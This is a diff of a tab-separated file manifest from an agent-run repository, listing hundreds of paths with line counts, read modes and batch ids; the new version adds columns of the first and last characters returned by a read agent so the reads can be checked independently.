-READ	.substrate/skills/scope-backlog-item/SKILL.md	76	full	b23
-READ	.substrate/skills/session-close/SKILL.md	67	full	b23
-READ	.substrate/skills/upgrade-distribution/SKILL.md	67	full	b23
-READ	.substrate/state.json	157	full	b23
-READ	.substrate/upgrade-report.md	75	full	b23
-READ	CONSTITUTION.md	154	full	b23
-READ	MISSION.md	48	full	b23
-READ	README.md	60	full	b23
-READ	bootstrap.py	28325	structural	b24
-READ	control/README.md	79	full	b25
-READ	control/claims/README.md	85	full	b25
-READ	control/inbox.md	1595	full	b25
-READ	control/outbox.md	810	full	b25
-READ	control/status.md	83	full	b25
-READ	docs/AGENT_ORIENTATION.md	100	full	b25
-READ	docs/CAPABILITIES-verified-2026-07-18.md	91	full	b26
-READ	docs/CAPABILITIES.md	1682	full	b26
-READ	docs/NEXT-TASKS.md	96	full	b26
-READ	docs/PROJECT-CLOSEOUT.md	403	full	b26
-READ	docs/RESUME.md	116	full	b26
-READ	docs/ROUTINES.md	101	full	b26
-READ	docs/SKILLS-local.md	323	full	b26
-READ	docs/SKILLS.md	104	full	b26
-READ	docs/_merge_verification_2026-07-15.md	9	full	b26
-READ	docs/ai-project-workflow.md	39	full	b27
-READ	docs/anthropic-email-pack.md	99	full	b27
-READ	docs/architecture.md	41	full	b27
-READ	docs/audits/eap-project-audit-2026-07-14.md	215	full	b27
-READ	docs/capabilities.md	9	full	b27
-READ	docs/central-docs-plan.md	10	full	b27
-READ	docs/collaboration-model.md	85	full	b27
-READ	docs/conventions/adversarial-review.md	479	full	b27
-READ	docs/conventions/outbox-rollover.md	58	full	b27
-READ	docs/conventions/owner-drive-folder.md	53	full	b27
-READ	docs/conventions/reading-screen-recordings.md	125	full	b27
-READ	docs/conventions/reading-shared-ai-chats.md	158	full	b27
-READ	docs/conventions/vertex-first-for-gemini.md	228	full	b27
-READ	docs/current-state.md	598	full	b27
-READ	docs/decisions.md	194	full	b27
-READ	docs/dispatch-log.md	671	full	b28
-READ	docs/eap-audit-collection.md	102	full	b28
-READ	docs/eap-final-email-draft-2026-07-14.md	77	full	b28
-READ	docs/eap-final-night-worklists-2026-07-13.md	252	full	b28
-READ	docs/eap-final-recon-2026-07-14.md	116	full	b28
-READ	docs/eap-owner-checklist-2026-07-14.md	76	full	b28
-READ	docs/eap-retrospective.md	427	full	b28
-READ	docs/eap-story.md	580	full	b29
-READ	docs/evidence-index.md	143	full	b29
-READ	docs/execution-surfaces.md	303	full	b29
-READ	docs/experiments/README.md	53	full	b29
-READ	docs/experiments/harness-x-model-2026-07-09.md	196	full	b29
-READ	docs/experiments/prompts/pair-fable.md	379	full	b29
-READ	docs/experiments/prompts/pair-opus.md	352	full	b29
-READ	docs/experiments/prompts/pair-sonnet.md	344	full	b29
-READ	docs/experiments/tools/wcag-contrast-check.py	27	full	b29
-READ	docs/fence-index.md	70	full	b29
-READ	docs/findings/2026-07-22-pat-and-automode-capabilities.md	129	full	b29
-READ	docs/findings/2026-08-04-generated-art-pipeline.md	328	full	b29
-READ	docs/findings/2026-08-05-foundation-continuation.md	260	full	b30
-READ	docs/findings/2026-08-05-gemini-delegation.md	146	full	b30
-READ	docs/findings/2026-08-05-gemini-url-accuracy-benchmark.md	177	full	b30
-READ	docs/findings/2026-08-05-google-play-submission-requirements.md	307	full	b30
-READ	docs/findings/2026-08-05-handoff-fidelity-and-boot-path.md	175	full	b30
-READ	docs/findings/2026-08-05-hud-telemetry-verification.md	103	full	b30
-READ	docs/findings/2026-08-05-owner-calibration-three-sessions.md	140	full	b30
-READ	docs/findings/2026-08-05-playtest-discord-and-superbot-value.md	299	full	b30
-READ	docs/findings/2026-08-05-superbot-next-live-audit.md	446	full	b30
-READ	docs/findings/2026-08-05-three-repo-state-audit.md	402	full	b30
-READ	docs/findings/2026-08-06-checker-classification.md	219	full	b30
-READ	docs/findings/2026-08-06-provenance-mechanism-measured.md	430	full	b30
-READ	docs/findings/2026-08-07-curious-research-handover.md	168	full	b30
-READ	docs/findings/2026-08-07-what-the-substrate-caught.md	140	full	b30
-READ	docs/findings/2026-08-08-why-rules-dont-bind.md	205	full	b31
-READ	docs/findings/2026-08-09-eap-correspondence-record.md	220	full	b31
-READ	docs/findings/2026-08-09-error-to-mechanism.md	341	full	b31
-READ	docs/findings/2026-08-09-independent-guard-review.md	192	full	b31
-READ	docs/findings/2026-08-09-intent-map-replay.md	190	full	b31
-READ	docs/findings/2026-08-09-substrate-kit-defects.md	202	full	b31
-READ	docs/findings/2026-08-10-fleet-manager-cold-read.md	135	full	b31
-READ	docs/findings/2026-08-10-fm835-verification.md	141	full	b31
-READ	docs/findings/README.md	38	full	b31
-READ	docs/findings/branch-recreation-census-2026-07-14.md	106	full	b31
-READ	docs/findings/ci-tier-sim-2026-07-09.md	220	full	b31
-READ	docs/findings/enabler-install-verification-2026-07-11.md	100	full	b31
-READ	docs/findings/fable5-review-2026-07-09.md	192	full	b31
-READ	docs/findings/fleet-economics-2026-07.md	106	full	b31
-READ	docs/findings/gba-toolchain-proof-2026-07-09.md	78	full	b31
-READ	docs/findings/gpt-5-6-report-2026-07-09.md	124	full	b31
-READ	docs/findings/instruction-and-env-audit-2026-07-11.md	293	full	b32
-READ	docs/findings/manifest-parallel-run-2026-07-11.md	69	full	b32
-READ	docs/findings/merge-on-green-rollout-verification-2026-07-15.md	135	full	b32
-READ	docs/findings/model-matrix-2026-07.md	77	full	b32
-READ	docs/findings/night-review-2026-07-10.md	1597	full	b32
-READ	docs/findings/permission-rules-port-2026-07-11.md	50	full	b32
-READ	docs/findings/ping-test-2026-07-09.md	155	full	b32
-READ	docs/findings/retro-synthesis-2026-07-09.md	833	full	b33
-READ	docs/findings/ui-visibility-2026-07-09.md	72	full	b33
-READ	docs/findings/ultracode-verification-2026-07-10.md	206	full	b33
-READ	docs/findings/venture-shortlist-2026-07-09.md	124	full	b33
-READ	docs/fleet-account-2026-07-26.md	314	full	b33
-READ	docs/fleet-inconsistencies-2026-07-13.md	302	full	b33
-READ	docs/fleet-triage.md	1823	full	b34
-READ	docs/gen2-blueprint.md	513	full	b34
-READ	docs/handoff-2026-07-09.md	167	full	b34
-READ	docs/handoff-2026-07-10.md	121	full	b35
-READ	docs/helper-policy.md	27	full	b35
-READ	docs/idea-routing-2026-07-18.md	59	full	b35
-READ	docs/ideas/README.md	120	full	b35
-READ	docs/ideas/archive-ready-retro-gap-advisory-2026-07-11.md	40	full	b35
-READ	docs/ideas/bot-analytics-lane-2026-07-09.md	22	full	b35
-READ	docs/ideas/checker-contract-bank-2026-08-09.md	56	full	b35
-READ	docs/ideas/derive-dont-state-counts-2026-08-10.md	56	full	b35
-READ	docs/ideas/design-system-lane-2026-07-09.md	22	full	b35
-READ	docs/ideas/devlog-building-in-public-2026-07-09.md	23	full	b35
-READ	docs/ideas/email-chief-of-staff-2026-07-09.md	22	full	b35
-READ	docs/ideas/fleet-economics-ledger-2026-07-10.md	41	full	b35
-READ	docs/ideas/fleet-security-auditor-2026-07-09.md	22	full	b35
-READ	docs/ideas/game-lab-2026-07-09.md	34	full	b35
-READ	docs/ideas/gba-play-discord-2026-07-10.md	51	full	b35
-READ	docs/ideas/lane-seeder-automation-2026-07-10.md	41	full	b35
-READ	docs/ideas/mobile-lab-lane-2026-07-09.md	23	full	b35
-READ	docs/ideas/research-desk-release-watcher-2026-07-09.md	24	full	b35
-READ	docs/ideas/review-queue-drainer-2026-07-10.md	46	full	b35
-READ	docs/ideas/spend-instrument-model-2026-07-09.md	24	full	b35
-READ	docs/ideas/superbot-production-watchdog-2026-07-09.md	22	full	b35
-READ	docs/intent.md	235	full	b35
-READ	docs/launch-readiness-2026-07-10.md	699	full	b35
-READ	docs/merge-queue-2026-07-09.md	46	full	b35
-READ	docs/owner-actions-2026-07-17.md	173	full	b35
-READ	docs/owner-profile.md	107	full	b35
-READ	docs/owner-queue-candidates.md	163	full	b36
-READ	docs/owner-queue.md	1183	full	b36
-READ	docs/owner-reflection-2026-07-21.md	256	full	b36
-READ	docs/owner-steps-2026-07-18.md	231	full	b36
-READ	docs/ownership.md	25	full	b36
-READ	docs/planning/2026-07-12-repo-consolidation-plan.md	387	full	b36
-READ	docs/planning/2026-07-14-central-docs-plan.md	389	full	b37
-READ	docs/planning/2026-07-19-next-slices.md	230	full	b37
-READ	docs/planning/2026-07-24-app-plan-life-admin.md	347	full	b37
-READ	docs/planning/2026-07-26-ci-consolidation.md	160	full	b37
-READ	docs/planning/2026-07-26-consolidation-plan-v2.md	233	full	b37
-READ	docs/planning/2026-07-26-consolidation-program.md	187	full	b37
-READ	docs/planning/2026-07-26-final-eap-email-plan.md	178	full	b37
-READ	docs/planning/2026-07-26-fleet-consolidation-plan.md	282	full	b37
-READ	docs/planning/2026-08-08-agent-operating-environment-roadmap.md	553	full	b38
-READ	docs/planning/2026-08-08-fleet-manager-as-index.md	221	full	b38
-READ	docs/planning/README.md	38	full	b38
-READ	docs/planning/gen2-launch-record-2026-07-10.md	106	full	b38
-READ	docs/planning/idea-backlog.md	61	full	b38
-READ	docs/planning/order-016-followups-2026-07-11.md	114	full	b38
-READ	docs/planning/overnight-menu-2026-07-17.md	251	full	b38
-READ	docs/playbook.md	388	full	b38
-READ	docs/pr-landing-audit-2026-07-16.md	131	full	b38
-READ	docs/pre-reboot-review-2026-07-15.md	101	full	b38
-READ	docs/project-recreation-runbook.md	86	full	b38
-READ	docs/prompts/2026-08-07-curious-research-external-review.md	145	full	b38
-READ	docs/prompts/README.md	82	full	b38
-READ	docs/prompts/baseline-2026-07-11/game-lab.md	29	full	b38
-READ	docs/prompts/baseline-2026-07-11/websites.md	27	full	b38
-READ	docs/prompts/chatgpt-project-instructions.md	137	full	b38
-READ	docs/prompts/codetool-arms.md	36	full	b38
-READ	docs/prompts/external-campaign-metaprompt.md	47	full	b38
-READ	docs/prompts/external-review-opus-2026-07-09.md	27	full	b38
-READ	docs/prompts/external-review-sonnet-2026-07-09.md	27	full	b38
-READ	docs/prompts/external/2026-07-12-gpt-deep-research-prompt.md	146	full	b39
-READ	docs/prompts/game-exploration.md	27	full	b39
-READ	docs/prompts/game-lab-founding.md	171	full	b39
-READ	docs/prompts/game-mining.md	27	full	b39
-READ	docs/prompts/gen1-winddown-universal.md	115	full	b39
-READ	docs/prompts/init-prompt-universal.md	70	full	b39
-READ	docs/prompts/trading-lab.md	26	full	b39
-READ	docs/prompts/universal-wakeup.md	26	full	b39
-READ	docs/prompts/v3/CHANGES-v3.4-to-v3.5.md	51	full	b39
-READ	docs/prompts/v3/README.md	120	full	b39
-READ	docs/prompts/v3/custom-instructions-core.md	106	full	b39
-READ	docs/prompts/v3/final-closer.md	26	full	b39
-READ	docs/prompts/v3/per-project/README.md	869	full	b39
-READ	docs/prompts/v3/per-project/curious-research-custom-instructions.md	47	full	b39
-READ	docs/prompts/v3/per-project/curious-research-startup.md	146	full	b40
-READ	docs/prompts/v3/per-project/fleet-manager-custom-instructions.md	48	full	b40
-READ	docs/prompts/v3/per-project/fleet-manager-startup.md	166	full	b40
-READ	docs/prompts/v3/per-project/game-lab-custom-instructions.md	48	full	b40
-READ	docs/prompts/v3/per-project/game-lab-startup.md	146	full	b40
-READ	docs/prompts/v3/per-project/ideas-lab-custom-instructions.md	47	full	b40
-READ	docs/prompts/v3/per-project/ideas-lab-startup.md	148	full	b40
-READ	docs/prompts/v3/per-project/self-improvement-custom-instructions.md	48	full	b40
-READ	docs/prompts/v3/per-project/self-improvement-startup.md	146	full	b41
-READ	docs/prompts/v3/per-project/superbot-custom-instructions.md	47	full	b41
-READ	docs/prompts/v3/per-project/superbot-startup.md	147	full	b41
-READ	docs/prompts/v3/per-project/superbot-world-custom-instructions.md	48	full	b41
-READ	docs/prompts/v3/per-project/superbot-world-startup.md	146	full	b41
-READ	docs/prompts/v3/per-project/venture-lab-custom-instructions.md	47	full	b41
-READ	docs/prompts/v3/per-project/venture-lab-startup.md	146	full	b41
-READ	docs/prompts/v3/per-project/websites-custom-instructions.md	48	full	b41
-READ	docs/prompts/v3/per-project/websites-startup.md	147	full	b42
-READ	docs/prompts/v3/planned-routes.md	61	full	b42
-READ	docs/prompts/v3/session-ender.md	17	full	b42
-READ	docs/prompts/v3/tools/regen_b_files.py	497	full	b42
-READ	docs/prompts/v3/tools/seat_digest_sync.py	629	full	b42
-READ	docs/prompts/v3/universal-continue.md	19	full	b42
-READ	docs/prompts/v3/universal-startup.md	38	full	b42
-READ	docs/prompts/venture-lab-draft.md	128	full	b42
-READ	docs/proposals/2026-07-12-consolidation-and-reset-plan.md	341	full	b42
-READ	docs/proposals/README.md	14	full	b42
-READ	docs/proposals/games-program-mapping-2026-07-10.md	189	full	b42
-READ	docs/proposals/games-program-mapping-conformed-2026-07-10.md	168	full	b42
-READ	docs/proposals/generated-roster-from-heartbeats.md	91	full	b42
-READ	docs/proposals/instructions/README.md	61	full	b42
-READ	docs/proposals/instructions/codetool-arm-template.md	325	full	b43
-READ	docs/proposals/instructions/game-lab.md	274	full	b43
-READ	docs/proposals/instructions/games-exploration.md	239	full	b43
-READ	docs/proposals/instructions/games-mining.md	289	full	b43
-READ	docs/proposals/instructions/mobile-lab.md	395	full	b43
-READ	docs/proposals/instructions/substrate-kit.md	277	full	b43
-READ	docs/proposals/instructions/superbot-next.md	310	full	b43
-READ	docs/proposals/instructions/trading-strategy.md	474	full	b43
-READ	docs/proposals/instructions/venture-lab.md	366	full	b43
-READ	docs/proposals/instructions/websites.md	468	full	b44
-READ	docs/proposals/universal-v5-hoist-bundle-2026-07-11.md	80	full	b44
-READ	docs/providers/README.md	90	full	b44
-READ	docs/providers/chatgpt.md	237	full	b44
-READ	docs/providers/claude.md	222	full	b44
-READ	docs/providers/cohere.md	72	full	b44
-READ	docs/providers/deepseek.md	99	full	b44
-READ	docs/providers/gemini.md	510	full	b44
-READ	docs/providers/github-copilot.md	145	full	b44
-READ	docs/providers/grok.md	146	full	b44
-READ	docs/providers/meta-llama.md	112	full	b44
-READ	docs/providers/mistral.md	111	full	b44
-READ	docs/q-index.md	62	full	b44
-READ	docs/question-router.md	32	full	b44
-READ	docs/reading-path.md	102	full	b44
-READ	docs/repo-navigation-map.md	21	full	b44
-READ	docs/repos/ACCEPTANCE-TESTS.md	191	full	b44
-READ	docs/repos/README.md	147	full	b44
-READ	docs/repos/spider-swing/README.md	221	full	b44
-READ	docs/repos/spider-swing/capabilities.md	152	full	b44
-READ	docs/repos/spider-swing/records.md	85	full	b44
-READ	docs/repos/spider-swing/working-here.md	122	full	b44
-READ	docs/research/2026-07-12-platform-capabilities.md	422	full	b45
-READ	docs/research/2026-07-12-problem-census-core.md	851	full	b45
-READ	docs/research/2026-07-12-problem-census-satellites.md	666	full	b45
-READ	docs/research/2026-07-12-prompt-architecture.md	243	full	b46
-READ	docs/research/2026-07-12-prompt-currency-audit.md	247	full	b46
-READ	docs/research/2026-07-12-qa-boot-simulation.md	790	full	b46
-READ	docs/research/2026-07-12-qa-incident-replay.md	253	full	b46
-READ	docs/research/2026-07-12-qa-question-rounds.md	893	full	b47
-READ	docs/research/2026-07-12-repo-consolidation-census.md	597	full	b47
-READ	docs/research/2026-07-12-staleness-sweep-8seat.md	117	full	b47
-READ	docs/research/2026-07-12-staleness-sweep-midday.md	67	full	b47
-READ	docs/research/2026-08-03-gemini-paid-tiers.md	180	full	b47
-READ	docs/research/2026-08-03-gemini-report-verification.md	193	full	b47
-READ	docs/research/2026-08-03-gemini-visual-qa-gem.md	350	full	b47
-READ	docs/research/2026-08-03-reducing-invented-detail.md	203	full	b47
-READ	docs/research/README.md	25	full	b47
-READ	docs/retro/archive-ready-2026-07-11.md	66	full	b47
-READ	docs/retro/coordinator-seat-2026-07-11.md	77	full	b47
-READ	docs/review-queue.md	153	full	b48
-READ	docs/roster.md	113	full	b48
-READ	docs/runtime_contracts.md	30	full	b48
-READ	docs/seat-digest.md	83	full	b48
-READ	docs/succession/coordinator-handoff-2026-07-11-evening.md	168	full	b48
-READ	docs/succession/coordinator-handoff-2026-07-11.md	131	full	b48
-READ	docs/trigger-health-spec.md	99	full	b48
-READ	docs/workflow-pr-merge-policy.md	55	full	b48
-READ	environments/README.md	59	full	b48
-READ	environments/SPEC-TEMPLATE.md	58	full	b48
-READ	environments/archetype-bot-prod.sh	53	full	b48
-READ	environments/archetype-coordinator.sh	50	full	b48
-READ	environments/archetype-gba-lab.sh	206	full	b48
-READ	environments/archetype-pinned-research.sh	52	full	b48
-READ	environments/archetype-python-lab.sh	46	full	b48
-READ	environments/archetypes.md	184	full	b48
-READ	environments/env-grant-policy.md	130	full	b48
-READ	environments/multi-repo.md	66	full	b48
-READ	environments/setup-base.sh	206	full	b48
-READ	environments/templates/env-vars.md	48	full	b48
-READ	environments/templates/setup-universal.sh	69	full	b48
-READ	environments/templates/smoke.yml	61	full	b48
-READ	project.index.json	62	full	b48
-READ	projects/README.md	270	full	b48
-READ	projects/UNIVERSAL.md	168	full	b48
-READ	projects/_inventory/inventory-games-new.md	386	full	b49
-READ	projects/_inventory/inventory-hub.md	138	full	b49
-READ	projects/_inventory/inventory-lanes.md	192	full	b49
-READ	projects/_inventory/trigger-registry-2026-07-10.md	321	full	b49
-READ	projects/codetool-lab-fable5/meta.md	10	full	b49
-READ	projects/codetool-lab-opus4.8/meta.md	10	full	b49
-READ	projects/codetool-lab-sonnet5/meta.md	10	full	b49
-READ	projects/curious-research/coordinator-prompt.md	156	full	b49
-READ	projects/curious-research/failsafe-prompt.md	47	full	b49
-READ	projects/curious-research/instructions.md	61	full	b49
-READ	projects/curious-research/meta.md	39	full	b49
-READ	projects/fleet-manager/coordinator-prompt.md	158	full	b49
-READ	projects/fleet-manager/failsafe-prompt.md	47	full	b49
-READ	projects/fleet-manager/instructions.md	62	full	b49
-READ	projects/fleet-manager/meta.md	91	full	b50
-READ	projects/fleet-manager/reboot-prompt.md	34	full	b50
-READ	projects/fleet-manager/seat-digest.md	50	full	b50
-READ	projects/fleet-manager/setup-script.sh	9	full	b50
-READ	projects/game-lab/coordinator-prompt.md	156	full	b50
-READ	projects/game-lab/failsafe-prompt.md	47	full	b50
-READ	projects/game-lab/instructions.md	62	full	b50
-READ	projects/game-lab/meta.md	26	full	b50
-READ	projects/game-lab/seat-digest.md	82	full	b50
-READ	projects/games-program/meta.md	10	full	b50
-READ	projects/gba-homebrew/meta.md	13	full	b50
-READ	projects/idea-engine/meta.md	13	full	b50
-READ	projects/ideas-lab/coordinator-prompt.md	158	full	b50
-READ	projects/ideas-lab/failsafe-prompt.md	47	full	b50
-READ	projects/ideas-lab/instructions.md	61	full	b50
-READ	projects/ideas-lab/meta.md	26	full	b50
-READ	projects/mobile-lab/meta.md	10	full	b50
-READ	projects/pokemon-mod-lab/meta.md	13	full	b50
-READ	projects/product-forge/coordinator-prompt.md	88	full	b50
-READ	projects/product-forge/failsafe-prompt.md	54	full	b50
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0001-wip-born-red-session-card-heartbeat-phone-controller.patch	161	full	b50
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0002-phone-controller-Slice-4-combo-HID-device-keyboard-g.patch	2179	full	b51
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0003-phone-controller-Slice-4-ci-debug-APK-artifact-hid-c.patch	201	full	b51
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/0004-close-out-Slice-4-heartbeat-session-card-complete-ve.patch	218	full	b51
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/README.md	70	full	b51
-READ	projects/product-forge/handoff/2026-07-23-phone-controller-slice4/land.sh	31	full	b51
-READ	projects/product-forge/instructions.md	129	full	b51
-READ	projects/product-forge/meta.md	88	full	b51
-READ	projects/product-forge/setup-script.sh	8	full	b51
-READ	projects/self-improvement/coordinator-prompt.md	156	full	b51
-READ	projects/self-improvement/failsafe-prompt.md	47	full	b51
-READ	projects/self-improvement/instructions.md	62	full	b51
-READ	projects/self-improvement/meta.md	26	full	b52
-READ	projects/sim-lab/meta.md	13	full	b52
-READ	projects/substrate-kit/meta.md	13	full	b52
-READ	projects/superbot-2.0/coordinator-prompt.md	157	full	b52
-READ	projects/superbot-2.0/failsafe-prompt.md	47	full	b52
-READ	projects/superbot-2.0/instructions.md	61	full	b52
-READ	projects/superbot-2.0/meta.md	26	full	b52
-READ	projects/superbot-games/meta.md	13	full	b52
-READ	projects/superbot-idle/meta.md	13	full	b52
-READ	projects/superbot-mineverse/meta.md	13	full	b52
-READ	projects/superbot-next/meta.md	13	full	b52
-READ	projects/superbot-retro/meta.md	10	full	b52
-READ	projects/superbot-world/coordinator-prompt.md	156	full	b52
-READ	projects/superbot-world/failsafe-prompt.md	47	full	b52
-READ	projects/superbot-world/instructions.md	62	full	b52
-READ	projects/superbot-world/meta.md	26	full	b52
-READ	projects/superbot/meta.md	13	full	b52
-READ	projects/trading-strategy/meta.md	13	full	b52
-READ	projects/venture-lab/coordinator-prompt.md	156	full	b52
-READ	projects/venture-lab/failsafe-prompt.md	47	full	b52
-READ	projects/venture-lab/instructions.md	61	full	b52
-READ	projects/venture-lab/meta.md	99	full	b52
-READ	projects/venture-lab/seat-digest.md	45	full	b52
-READ	projects/venture-lab/setup-script.sh	8	full	b52
-READ	projects/websites/coordinator-prompt.md	157	full	b53
-READ	projects/websites/failsafe-prompt.md	47	full	b53
-READ	projects/websites/instructions.md	62	full	b53
-READ	projects/websites/meta.md	106	full	b53
-READ	projects/websites/setup-script.sh	8	full	b53
-READ	registry/README.md	21	full	b53
-READ	registry/kit-versions.md	31	full	b53
-READ	registry/lanes.json	251	full	b53
-READ	scripts/assemble_triggers_snapshot.py	356	full	b53
-READ	scripts/check_capabilities_grammar.py	577	full	b53
-READ	scripts/check_capabilities_wall_age.py	474	full	b53
-READ	scripts/check_docs_links.py	399	full	b53
-READ	scripts/check_fleet_triage_staleness.py	457	full	b53
-READ	scripts/check_label_hygiene.py	343	full	b53
-READ	scripts/check_lane_liveness.py	917	full	b54
-READ	scripts/check_owner_queue.py	588	full	b54
-READ	scripts/check_roster_freshness.py	381	full	b54
-READ	scripts/check_trigger_health.py	793	full	b54
-READ	scripts/emit_routine_claims.py	347	full	b54
-READ	scripts/env-setup.sh	55	full	b54
-READ	scripts/fixtures/owner-queue-known-bad.md	56	full	b54
-READ	scripts/fixtures/owner-queue-known-good.md	35	full	b54
-READ	scripts/fixtures/r30/clean.yml	13	full	b54
-READ	scripts/fixtures/r30/exfil.yml	15	full	b54
-READ	scripts/fixtures/r30/github-scoped.yml	18	full	b54
-READ	scripts/gen_idea_backlog.py	294	full	b54
-READ	scripts/gen_kit_versions.py	238	full	b54
-READ	scripts/gen_roster.py	2154	full	b55
-READ	scripts/preflight.py	113	full	b55
-READ	scripts/r30_merge_check.py	537	full	b55
-READ	scripts/verify_routine_state.py	749	full	b55
-READ	substrate.config.json	103	full	b55
-READ	telemetry/README.md	80	full	b55
-READ	telemetry/lane-liveness-ledger.jsonl	7	full	b55
-READ	telemetry/model-usage.jsonl	1	full	b55
-READ	telemetry/triggers-snapshot.json	1	structural	b56
-READ	templates/worker-preamble.md	40	full	b57
-READ	tools/ab_kit_scan.py	234	full	b57
-READ	tools/check_doc_routes.py	150	full	b57
-READ	tools/check_no_false_walls.py	631	full	b57
-READ	tools/chroma_spill_probe.py	47	full	b57
-READ	tools/gemini_delegate.py	487	full	b57
-READ	tools/install_root_hooks.py	175	full	b57
-READ	tools/read_screen_recording.py	60	full	b57
-READ	tools/read_shared_chat.py	160	full	b57
-READ	tools/sim/ci_tier_sim.py	790	full	b57
-READ	tools/test_change_guard.py	122	full	b57
-READ	tools/test_trigger_tools_guard.py	317	full	b57
+# The head60/tail60 columns are the values the READ AGENT RETURNED. They are kept
+# so a third party can recompute them from the tree and reproduce the comparison
+# rather than take this file's word for it. See verification.md for what they do
+# and do not establish.
+# status	path	lines	mode	batch	head60	tail60
+READ	.claude/CLAUDE.md	318	full	b01	# fleet-manager — hub · agent boot file	deliverables; an invented wall is the only real failure.
+READ	.claude/hooks/README.md	514	full	b01	# Hooks — the doc-routing net	guard when the owner is away to wave it through.
+READ	.claude/hooks/change_guard.py	416	full	b01	#!/usr/bin/env python3	        sys.exit(0)
+READ	.claude/hooks/doc-routes.json	369	full	b01	{	}
+READ	.claude/hooks/git_state_guard.py	229	full	b01	#!/usr/bin/env python3	  # fail open, always — advisory must never trap the session
+READ	.claude/hooks/owner_review.py	480	full	b01	#!/usr/bin/env python3	    sys.exit(0)
+READ	.claude/hooks/read_before_write.py	316	full	b01	#!/usr/bin/env python3	        sys.exit(0)  # fail open, always
+READ	.claude/hooks/route_docs.py	219	full	b01	#!/usr/bin/env python3	        sys.exit(0)  # fail open, always
+READ	.claude/hooks/trigger_tools_guard.py	344	full	b01	#!/usr/bin/env python3	)  # fail open, always — a guard must never trap the session
+READ	.claude/settings.json	104	full	b01	{	}
+READ	.claude/skills/analysis/SKILL.md	14	full	b01	---	Declared capabilities: read-only.
+READ	.claude/skills/asset-pipeline/SKILL.md	106	full	b01	---	  Check the renderer before blaming the pipeline.
+READ	.claude/skills/audio-prompt/SKILL.md	105	full	b01	---	  source record must say which files came from where.
+READ	.claude/skills/capability-probe/SKILL.md	98	full	b01	---	  Self-report is training data; the probe is telemetry.
+READ	.claude/skills/chase-references/SKILL.md	62	full	b01	---	Declared capabilities: read-only.
+READ	.claude/skills/continuation-prompt/SKILL.md	229	full	b01	---	  is the signal to commit instead — go back to step 3.
+READ	.claude/skills/cover-art-prompt/SKILL.md	98	full	b02	---	  margin rule, not a crop of the key art.
+READ	.claude/skills/decision-capture/SKILL.md	96	full	b02	---	g path. If it is not, it is a rejected record, not a record.
+READ	.claude/skills/deep-research/SKILL.md	16	full	b02	---	Declared capabilities: run.
+READ	.claude/skills/delegate-read/SKILL.md	100	full	b02	---	  session that is accountable for it.
+READ	.claude/skills/image-prompt/SKILL.md	144	full	b02	---	batches; Gemini for expressive one-offs).
+READ	.claude/skills/implementation-prompt/SKILL.md	150	full	b02	---	  the most common reason otherwise-good work does not land.
+READ	.claude/skills/intake/SKILL.md	167	full	b02	---	estate's clearest misread was never preserved.
+READ	.claude/skills/owner-brief/SKILL.md	74	full	b02	---	  each item appeared.
+READ	.claude/skills/parallax-prompt/SKILL.md	102	full	b02	---	key instead — palette collision is the one reason to switch.
+READ	.claude/skills/prep-owner-steps/SKILL.md	81	full	b02	---	own capabilities do any writing).
+READ	.claude/skills/prompt-preflight/SKILL.md	126	full	b02	---	 prompt as doubt rather than being quietly promoted to fact.
+READ	.claude/skills/quality-gate/SKILL.md	15	full	b02	---	Declared capabilities: run.
+READ	.claude/skills/question/SKILL.md	14	full	b02	---	Declared capabilities: read-only.
+READ	.claude/skills/rationalize/SKILL.md	58	full	b02	---	own capabilities do any shipping).
+READ	.claude/skills/release/SKILL.md	87	full	b02	---	git + gh).
+READ	.claude/skills/repo-health/SKILL.md	15	full	b02	---	Declared capabilities: run.
+READ	.claude/skills/review/SKILL.md	16	full	b02	---	Declared capabilities: comment.
+READ	.claude/skills/scope-backlog-item/SKILL.md	86	full	b02	---	s: read (the origin refs, the backlog, the docs-gate rules).
+READ	.claude/skills/session-close/SKILL.md	173	full	b02	---	capabilities: edit (the log + docs), run (the checks + git).
+READ	.claude/skills/sprite-prompt/SKILL.md	103	full	b02	---	  separate the two overlapping legs into two distinct legs."
+READ	.claude/skills/upgrade-distribution/SKILL.md	67	full	b02	---	checks).
+READ	.gitattributes	3	full	b02	# substrate-kit search hygiene (planted by adopt/upgrade; th	/.substrate/backup/** linguist-generated=true
+READ	.github/workflows/merge-on-green.yml	270	full	b02	# merge-on-green — the repo's own landing path for agent PRs	          PY
+READ	.github/workflows/roster-freshness.yml	62	full	b02	# roster-freshness — PR gate on the roster's generated-at st	          python3 scripts/check_roster_freshness.py
+READ	.github/workflows/roster-regen.yml	204	full	b02	# roster-regen — automated docs/roster.md regeneration on a 	          fi
+READ	.github/workflows/substrate-gate.yml	316	full	b02	# substrate-kit enforcement gate (LIVE — installed by `boots	            --session-log .sessions/__no-card-in-diff__.md
+READ	.gitignore	12	full	b03	__pycache__/	HANDOFF.md
+READ	.ignore	3	full	b03	# substrate-kit search hygiene (planted by adopt/upgrade; th	/.substrate/backup/
+READ	.session-journal.md	27	full	b03	# fleet-manager — session journal (process memory)	(Proposed working-agreement rules awaiting owner review.)
+READ	.sessions/2026-07-09-ci-tier-standard.md	79	full	b03	# 2026-07-09 — CI-tier standard: sim-backed 3-tier CI doctri	ngs / blueprint / template each landed as separate commits).
+READ	.sessions/2026-07-09-game-lab-founding.md	90	full	b03	# 2026-07-09 — game-lab founding package (two-track GBA vent	it's a cap or a preference.
+READ	.sessions/2026-07-09-gen1-winddown-prompt.md	60	full	b03	# 2026-07-09 — gen-1 wind-down universal prompt (fleet-wide 	the session idea above proposes the mechanical check.
+READ	.sessions/2026-07-09-housekeeping-verification.md	60	full	b03	# 2026-07-09 — housekeeping: verification sweep + docs refre	cheapest guard we have).
+READ	.sessions/2026-07-09-ideas-r21-handoff.md	72	full	b03	# 2026-07-09 — owner-session idea capture + playbook R21 + n	email).
+READ	.sessions/2026-07-09-merge-authority-env-archetypes.md	76	full	b03	# 2026-07-09 — merge-authority policy + env archetypes + mer	cross-repo scavenger hunts.
+READ	.sessions/2026-07-09-ping-ack-gen2-finalization.md	73	full	b03	# 2026-07-09 — ping-ack read-half sweep + gen-2 blueprint fi	verified-at-HEAD annotations with dates on every drift fix.
+READ	.sessions/2026-07-09-seed-home-repo.md	37	full	b03	# 2026-07-09 — seed home repo + adopt substrate-kit	md — capturing them as the seed content was the improvement.
